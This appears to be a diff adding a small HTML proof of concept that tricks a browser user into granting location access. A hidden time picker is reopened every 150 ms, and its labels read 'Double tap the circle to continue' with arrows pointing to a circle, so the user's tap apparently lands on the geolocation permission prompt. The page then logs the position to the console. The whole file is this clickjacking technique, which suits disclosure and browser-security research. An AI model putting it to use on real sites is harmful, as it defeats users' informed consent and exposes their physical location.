@@ -1,0 +1,38 @@
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<h1>
+    Tap the screen to start
+</h1>
+
+<input id="input" type="time" list="times" style="display:none;" />
+<datalist id="times">
+    <select>
+        <option label="Double tap the circle to continue">00:00</option>
+        <option label="â¬‡&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;">00:00</option>
+        <option label="â¬‡&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;">00:00</option>
+        <option label="â¬‡&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;">00:00</option>
+        <option label="â¬‡&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;">00:00</option>
+        <option label="â­•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;">00:00</option>
+        <option label="">00:00</option>
+    </select>
+</datalist>
+
+
+<script>
+
+    function showList() {
+        if (navigator.permissions.query({ name: 'geolocation' }).state === 'granted') return;
+
+        input.showPicker();
+    }
+
+    document.body.onclick = async () => {
+        showList();
+
+        setInterval(showList, 150);
+
+        navigator.geolocation.getCurrentPosition(console.log, console.error);
+
+    };
+</script>
